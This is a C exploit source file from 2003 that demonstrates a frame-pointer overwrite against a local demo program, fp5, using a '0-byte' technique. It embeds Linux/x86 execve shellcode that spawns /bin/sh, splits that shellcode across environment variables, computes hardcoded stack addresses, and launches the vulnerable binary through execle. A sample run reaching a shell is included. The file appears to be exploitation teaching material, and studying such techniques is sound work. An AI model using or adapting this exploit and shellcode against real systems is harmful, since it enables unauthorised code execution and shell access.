/*
 * $Id: fp5-ex.c,v 1.1.1.1 2004/05/29 14:15:04 raptor Exp $
 *
 * fp5-ex.c - fp5.c exploit (fp overwrite 0-byte technique)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit demonstrates the 0-byte technique outlined in the excellent
 * paper titled "Radical Environmentalists Part II", by gloomy & the itch
 * from Netric Security Team. We simply convert our 1D array of shellcode
 * (containing a lot of 0-bytes) into a 2D matrix and pass it using envp.
 *
 * $ ./fp5-ex 
 * Using ebp: 0xbfffffed
 * Using ret: 0xbfffffc7
 * sh-2.05a$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN		"./fp5"		// the vulnerable program
#define	DUMMY		"0xdeadbeef"	// dummy string representing an addr
#define	MAX_SIZE	64		// max number of 0-bytes in array

char sc[] = /* crappy linux/x86 shellcode with 0-bytes */
"\x68/sh\0\x68/bin"
"\x89\xe3\x6a\x00\x53\x89\xe1\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80"
"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80";

int array2matrix(char **matrix, char *array, int size)
{
	int i, j = 0;
	char *p = array;

	/* convert a 1D array to a 2D matrix */
	for (i = 0; j < size; i++) {
		matrix[i] = (char *)malloc(strlen(p) + 1);
		strcpy(matrix[i], p);
		j += strlen(p) + 1;
		p += strlen(p) + 1;
	}

	/* return matrix size (number of 0-bytes in array) */
	return(i);
}

int main()
{
	char ebp_str[16];
	char *env[MAX_SIZE + 1];
	int env_size;

	/* calculate the new ebp */
	int ebp = 0xbffffffa - (strlen(VULN)) - 8;

	/* calculate the new ret */
	int ret = (ebp + 4) - sizeof(sc);

	fprintf(stderr, "Using ebp: %p\n", ebp);
	fprintf(stderr, "Using ret: %p\n", ret);

	/* convert the 1D shellcode in a 2D envp */
	env_size = array2matrix(env, sc, sizeof(sc));

	/* copy ret at the end of the env matrix */
	env[env_size] = (char *)malloc(4);
	memcpy(env[env_size], (char *)&ret, 4);
	env[env_size + 1] = 0x0;

	/* convert ebp to string */
	snprintf(ebp_str, sizeof(ebp_str), "%p", ebp);

	/* run the vulnerable program */
	execle(VULN, VULN + 2, DUMMY, DUMMY, DUMMY, DUMMY, ebp_str, NULL, env);
	perror("execle");
}
